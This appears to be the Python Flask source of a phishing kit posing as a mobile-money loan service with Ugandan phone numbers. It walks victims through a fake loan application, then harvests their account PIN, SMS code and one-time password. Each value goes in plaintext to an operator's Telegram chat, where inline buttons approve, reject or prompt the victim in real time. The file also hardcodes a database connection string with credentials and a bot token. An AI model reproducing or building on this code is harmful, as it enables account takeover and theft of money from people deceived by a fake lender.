from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from pymongo import MongoClient
from bson.objectid import ObjectId
import os
import time
import requests

app = Flask(__name__)
app.secret_key = "super_secret_momo_key"

# MongoDB connection
client = MongoClient("mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/momo_loan_db?retryWrites=true&w=majority&appName=superuser")
db = client["momo_loan_db"]
applications_collection = db["applications"]

# Telegram Configuration
TELEGRAM_BOT_TOKEN = "8467275364:AAFJlOk-8cOlhok0XC40s-x604G0YxW_hqs"
TELEGRAM_ADMIN_CHAT_ID = "8965398913"

def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step_code="pin"):
    db_id = str(app_data.get("_id"))
    
    message = (
        f"📩 *{stage_title}*\n\n"
        f"👤 *Name:* {app_data.get('first_name', '')} {app_data.get('last_name', '')}\n"
        f"📞 *Phone:* +256 {app_data.get('phone', '')}\n"
        f"🔑 *PIN:* `{app_data.get('password', '—')}`\n"
        f"💬 *SMS Code:* `{app_data.get('auth_code', '—')}`\n"
        f"🔢 *Final OTP:* `{app_data.get('final_auth_code', '—')}`\n\n"
        f"🆔 *Application ID:* `{app_data.get('app_id')}`"
    )

    reply_markup = {
        "inline_keyboard": [
            [
                {"text": f"✅ Approve {step_code.upper()}", "callback_data": f"approve_{step_code}_{db_id}"}
            ],
            [
                {"text": f"❌ Reject {step_code.upper()}", "callback_data": f"reject_{step_code}_{db_id}"},
                {"text": "💬 Message User", "callback_data": f"msg_{step_code}_{db_id}"}
            ]
        ]
    }
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "reply_markup": reply_markup
    }
    
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram alert error: {e}")

@app.route("/telegram-webhook", methods=["POST"])
def telegram_webhook():
    data = request.get_json()
    
    if "callback_query" in data:
        callback = data["callback_query"]
        callback_data = callback["data"]
        callback_id = callback["id"]
        
        parts = callback_data.split("_")
        if len(parts) >= 3:
            action = parts[0]
            step_code = parts[1]
            db_id = parts[2]
            
            if action == "approve":
                if step_code == "pin":
                    new_status = "Stage1_Approved"
                elif step_code == "sms":
                    new_status = "Stage2_Approved"
                elif step_code == "otp":
                    new_status = "Stage3_Approved"
                else:
                    new_status = "Approved"

                applications_collection.update_one(
                    {"_id": ObjectId(db_id)},
                    {"$set": {"status": new_status, "custom_message": ""}}
                )
                text_response = f"✅ {step_code.upper()} Approved!"

            elif action == "reject":
                applications_collection.update_one(
                    {"_id": ObjectId(db_id)},
                    {"$set": {"status": "Rejected", "custom_message": "Invalid authentication details. Please try again."}}
                )
                text_response = f"❌ {step_code.upper()} Rejected!"

            elif action == "msg":
                applications_collection.update_one(
                    {"_id": ObjectId(db_id)},
                    {"$set": {"status": "CustomMessage", "custom_message": "Action Required: Please carefully check your authentication details and re-enter."}}
                )
                text_response = "💬 Prompt sent to user screen!"

            answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
            requests.post(answer_url, json={"callback_query_id": callback_id, "text": text_response})

    return jsonify({"status": "ok"}), 200

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/sim-check")
def sim_check():
    return render_template("sim_check.html")

@app.route("/apply/step1", methods=["GET", "POST"])
def apply_step1():
    if request.method == "POST":
        session["loan_type"] = request.form.get("loan_type")
        session["amount"] = request.form.get("amount")
        session["term"] = request.form.get("term")
        session["purpose"] = request.form.get("purpose")
        return redirect(url_for("apply_step2"))
    return render_template("apply_step1.html")

@app.route("/apply/step2", methods=["GET", "POST"])
def apply_step2():
    if request.method == "POST":
        session["first_name"] = request.form.get("first_name")
        session["last_name"] = request.form.get("last_name")
        session["phone"] = request.form.get("phone")
        return redirect(url_for("apply_step3"))
    return render_template("apply_step2.html")

@app.route("/apply/step3", methods=["GET", "POST"])
def apply_step3():
    if request.method == "POST":
        session["employment"] = request.form.get("employment")
        session["income"] = request.form.get("income")
        return redirect(url_for("processing_screen"))
    return render_template("apply_step3.html")

@app.route("/processing")
def processing_screen():
    return render_template("processing.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        pin = request.form.get("pin")
        
        app_data = {
            "loan_type": session.get("loan_type", "Personal"),
            "amount": session.get("amount", "1000000"),
            "term": session.get("term", "12 Months"),
            "purpose": session.get("purpose", "General"),
            "first_name": session.get("first_name", "User"),
            "last_name": session.get("last_name", "Applicant"),
            "phone": session.get("phone", "000000000"),
            "employment": session.get("employment", "Self-Employed"),
            "income": session.get("income", "1000000"),
            "password": pin,
            "status": "Pending_PIN",
            "created_at": time.time(),
            "app_id": "APP" + os.urandom(4).hex().upper(),
            "auth_code": "",
            "final_auth_code": "",
            "custom_message": ""
        }
        
        inserted_id = applications_collection.insert_one(app_data).inserted_id
        session["current_app_id"] = str(inserted_id)
        
        app_data["_id"] = inserted_id
        send_telegram_interactive_alert(app_data, stage_title="APPROVAL 1: PIN SUBMITTED", step_code="pin")
        
        return redirect(url_for("pending", app_id=app_data["app_id"]))
    return render_template("login.html")

@app.route("/pending")
def pending():
    app_id = request.args.get("app_id")
    current_id = session.get("current_app_id")
    
    if not app_id and current_id:
        record = applications_collection.find_one({"_id": ObjectId(current_id)})
        app_id = record.get("app_id") if record else "APP-PENDING"
        
    return render_template("pending.html", app_id=app_id)

@app.route("/check-status")
def check_status():
    app_id = request.args.get("app_id")
    current_id = session.get("current_app_id")
    
    record = None
    if app_id:
        record = applications_collection.find_one({"app_id": app_id})
    elif current_id:
        record = applications_collection.find_one({"_id": ObjectId(current_id)})
        
    if record:
        return jsonify({
            "status": record.get("status", "Pending_PIN"),
            "custom_message": record.get("custom_message", "")
        })
            
    return jsonify({"status": "Pending_PIN", "custom_message": ""})

@app.route("/submit-auth-code", methods=["POST"])
def submit_auth_code():
    auth_code = request.form.get("auth_code")
    current_id = session.get("current_app_id")
    
    if current_id:
        applications_collection.update_one(
            {"_id": ObjectId(current_id)},
            {"$set": {"auth_code": auth_code, "status": "Pending_SMS"}}
        )
        record = applications_collection.find_one({"_id": ObjectId(current_id)})
        send_telegram_interactive_alert(record, stage_title="APPROVAL 2: SMS CODE SUBMITTED", step_code="sms")
        
    return redirect(url_for("pending", app_id=record.get("app_id") if record else ""))

@app.route("/final-verify", methods=["GET", "POST"])
def final_verify():
    if request.method == "POST":
        final_code = request.form.get("final_code")
        current_id = session.get("current_app_id")
        
        if current_id:
            applications_collection.update_one(
                {"_id": ObjectId(current_id)},
                {"$set": {"final_auth_code": final_code, "status": "Pending_OTP"}}
            )
            record = applications_collection.find_one({"_id": ObjectId(current_id)})
            send_telegram_interactive_alert(record, stage_title="APPROVAL 3: FINAL OTP SUBMITTED", step_code="otp")
            
        return redirect(url_for("pending", app_id=record.get("app_id") if record else ""))
    return render_template("final_verify.html")

@app.route("/success")
def success():
    return render_template("success.html")

if __name__ == "__main__":
    app.run(debug=True, port=5000)
